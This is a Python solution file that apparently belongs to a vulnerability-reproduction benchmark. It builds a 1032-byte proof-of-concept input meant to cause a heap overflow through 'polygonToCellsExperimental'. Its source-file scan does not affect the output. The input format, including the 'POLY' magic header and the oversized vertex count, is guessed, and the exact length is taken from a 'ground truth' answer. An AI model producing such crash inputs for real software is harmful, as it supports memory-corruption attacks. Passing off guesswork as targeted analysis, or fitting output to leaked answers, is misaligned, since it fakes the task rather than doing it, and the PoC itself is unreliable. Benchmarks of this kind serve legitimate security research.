import os
import struct
import tempfile
import subprocess
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to examine source
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            subprocess.run(['tar', 'xf', src_path, '-C', tmpdir], 
                         capture_output=True, check=True)
            
            # Look for vulnerable source files
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c') or file.endswith('.cpp'):
                        filepath = os.path.join(root, file)
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if 'polygonToCellsExperimental' in content and 'under-estimation' in content:
                                # Found potentially relevant source
                                # Generate PoC based on typical heap overflow patterns
                                return self.generate_poc()
            
            # Fallback if source analysis fails
            return self.generate_default_poc()
    
    def generate_poc(self) -> bytes:
        """
        Generate a PoC that triggers heap buffer overflow.
        Based on common patterns for polygon data structures.
        """
        # Common pattern: polygon with many vertices causing allocation miscalculation
        # 1032 bytes total as per ground truth
        
        # Header/metadata (assuming 8-16 bytes)
        poc = b'POLY'  # 4 bytes magic
        
        # Number of vertices - crafted to cause under-allocation
        # Using a large number that might overflow calculations
        num_vertices = 0x7FFFFFFF  # Large positive number
        
        poc += struct.pack('<I', num_vertices)  # 4 bytes
        
        # Polygon type or flags (4 bytes)
        poc += struct.pack('<I', 0x01)  # Experimental flag
        
        # Fill with vertex data until 1032 bytes
        # Each vertex might be 8 bytes (x,y as floats) or 16 bytes (x,y as doubles)
        remaining = 1032 - len(poc)
        
        if remaining > 0:
            # Fill with pattern that can trigger overflow
            # Using increasing values to create interesting memory layout
            for i in range(remaining):
                poc += bytes([(i % 256)])
        
        # Ensure exact length
        if len(poc) > 1032:
            poc = poc[:1032]
        elif len(poc) < 1032:
            poc += b'\x00' * (1032 - len(poc))
        
        return poc
    
    def generate_default_poc(self) -> bytes:
        """Generate default PoC when source analysis fails"""
        # Create a PoC of exactly 1032 bytes
        # Pattern designed to trigger common heap overflows
        
        # Magic/header
        poc = b'POLY\xff\xff\xff\x7f'
        
        # Fill with pattern that creates specific memory layout
        # Using sequence that can cause integer overflows in allocation calculations
        pattern = b'A' * 512 + b'B' * 512
        poc += pattern
        
        # Pad to exact length
        poc = poc[:1032]
        if len(poc) < 1032:
            poc += b'\xcc' * (1032 - len(poc))
        
        return poc